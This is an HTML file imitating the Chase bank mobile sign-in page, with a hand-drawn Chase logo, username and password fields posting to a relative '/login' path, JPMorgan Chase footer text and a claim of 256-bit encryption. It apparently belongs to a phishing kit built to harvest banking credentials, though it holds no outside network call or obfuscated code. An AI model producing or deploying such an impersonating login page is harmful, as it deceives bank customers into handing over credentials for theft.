<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Chase – Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
  :root{--blue:#0066CC;--blue-dark:#0050A0;--green:#2A7D2E;--text:#111;--border:#DDD;--red:#cc0000}
  body{font-family:'Roboto',sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;max-width:430px;margin:0 auto;opacity:0;animation:fadeIn .5s ease forwards}
  @keyframes fadeIn{to{opacity:1}}
  .top-nav{width:100%;background:white;border-bottom:1px solid var(--border);padding:0 16px;height:52px;display:flex;align-items:center;justify-content:center}
  .chase-logo{display:flex;align-items:center;gap:6px;text-decoration:none}
  .chase-wordmark{font-size:22px;font-weight:700;color:var(--text);letter-spacing:.5px}
  .chase-octagon{width:26px;height:26px;background:var(--blue);clip-path:polygon(29% 0%,71% 0%,100% 29%,100% 71%,71% 100%,29% 100%,0% 71%,0% 29%);display:flex;align-items:center;justify-content:center}
  .chase-octagon-inner{width:14px;height:14px;background:white;clip-path:polygon(29% 0%,71% 0%,100% 29%,100% 71%,71% 100%,29% 100%,0% 71%,0% 29%);display:flex;align-items:center;justify-content:center}
  .chase-octagon-core{width:8px;height:8px;background:var(--blue);clip-path:polygon(29% 0%,71% 0%,100% 29%,100% 71%,71% 100%,29% 100%,0% 71%,0% 29%)}
  .login-card{width:100%;background:white;margin-top:24px;padding:28px 24px 32px;border-top:1px solid var(--border);border-bottom:1px solid var(--border)}
  .login-card h1{font-size:22px;font-weight:700;margin-bottom:24px;color:var(--text)}
  .error-box{background:#fff0f0;border:1px solid #ffcccc;border-left:4px solid var(--red);padding:12px 14px;border-radius:3px;margin-bottom:18px;font-size:14px;color:var(--red);display:none}
  .error-box.show{display:block}
  .field{margin-bottom:18px}
  .field label{display:block;font-size:14px;font-weight:500;margin-bottom:6px;color:var(--text)}
  .field input{width:100%;border:1.5px solid #999;border-radius:3px;padding:12px 14px;font-size:16px;font-family:inherit;color:var(--text);outline:none;transition:border-color .15s}
  .field input:focus{border-color:var(--blue)}
  .password-wrap{position:relative}
  .password-wrap input{padding-right:46px}
  .eye-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#888;padding:4px;display:flex;align-items:center;justify-content:center}
  .eye-btn:hover{color:#444}
  .forgot{display:block;text-align:right;margin-top:6px;font-size:13px;color:var(--blue);text-decoration:underline}
  .btn-login{width:100%;background:var(--blue);color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;font-family:inherit;margin-top:8px;transition:background .15s}
  .btn-login:hover{background:var(--blue-dark)}
  .divider{display:flex;align-items:center;gap:12px;margin:22px 0}
  .divider hr{flex:1;border:none;border-top:1px solid var(--border)}
  .divider span{font-size:13px;color:#888}
  .btn-enroll{width:100%;background:white;color:var(--blue);border:1.5px solid var(--blue);padding:13px;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;font-family:inherit}
  .back-link{margin-top:18px;font-size:13px;text-align:center}
  .back-link a{color:var(--blue);text-decoration:underline}
  .footer-note{font-size:11px;color:#888;text-align:center;padding:20px 24px;line-height:1.6}
</style>
</head>
<body>
<div class="top-nav">
  <a class="chase-logo" href="/">
    <span class="chase-wordmark">CHASE</span>
    <div class="chase-octagon"><div class="chase-octagon-inner"><div class="chase-octagon-core"></div></div></div>
  </a>
</div>
<div class="login-card">
  <h1>Sign in</h1>
  <div class="error-box" id="errorBox">⚠️ The username or password you entered is incorrect. Please try again.</div>
  <form method="POST" action="/login">
    <div class="field">
      <label for="username">Username</label>
      <input type="text" id="username" name="username" autocomplete="username" placeholder="Enter your username" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <div class="password-wrap">
        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Enter your password" required>
        <button type="button" class="eye-btn" onclick="togglePwd()" id="eyeBtn" aria-label="Toggle password visibility">
          <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
      <a href="#" class="forgot">Forgot password?</a>
    </div>
    <button type="submit" class="btn-login">Sign in</button>
  </form>
  <div class="divider"><hr><span>or</span><hr></div>
  <button class="btn-enroll">Not a Chase customer? Enroll now</button>
  <div class="back-link"><a href="/">← Back to Chase.com</a></div>
</div>
<div class="footer-note">© 2026 JPMorgan Chase &amp; Co. · Member FDIC · Equal Housing Opportunity<br>Your data is protected with 256-bit encryption.</div>
<script>
  if(new URLSearchParams(window.location.search).get('error')==='1'){
    document.getElementById('errorBox').classList.add('show');
  }
  function togglePwd(){
    const inp=document.getElementById('password');
    const icon=document.getElementById('eyeIcon');
    if(inp.type==='password'){
      inp.type='text';
      icon.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23" stroke-width="2"/>';
    } else {
      inp.type='password';
      icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    }
  }
</script>
</body>
</html>
